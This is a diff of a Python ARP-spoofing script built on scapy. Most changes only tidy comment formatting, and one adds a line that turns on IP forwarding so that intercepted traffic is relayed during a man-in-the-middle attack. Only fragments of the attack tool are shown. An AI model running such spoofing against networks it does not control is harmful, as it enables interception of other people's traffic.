@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-#Imports
+# Imports
 import os
 import sys
 import netifaces as ni
@@ -8,7 +8,7 @@ import re
 import scapy.all as scapy
 import time
 
-#Functions
+# Functions
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
@@ -27,7 +27,7 @@ def restore(dest_ip, src_ip):
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
     scapy.send(packet,count=4 , verbose=False)
 
-#Main
+# Main
 print('''
 ░█████╗░██████╗░██████╗░░██████╗██████╗░░█████╗░░█████╗░███████╗██████╗░██╗░░░██╗
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚██╗░██╔╝
@@ -36,11 +36,15 @@ print('''
 ██║░░██║██║░░██║██║░░░░░██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░██║░░░░░░░░██║░░░
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░\n''')
 
-#Check if user is root
+# Check if user is root
 if not os.geteuid()==0:
     sys.exit('This script must be run as root!')
 else:
     print("User is root, the script can continue...\n")
+
+# Allow Forwarding
+os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
 
 ip_pattern = re.compile("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")
 
@@ -82,7 +86,7 @@ else:
     exit(0)
 
 
-#Get mac address
+# Get mac address
 try:
     target_mac_address = get_mac(ip_address_of_target)
 except IndexError:
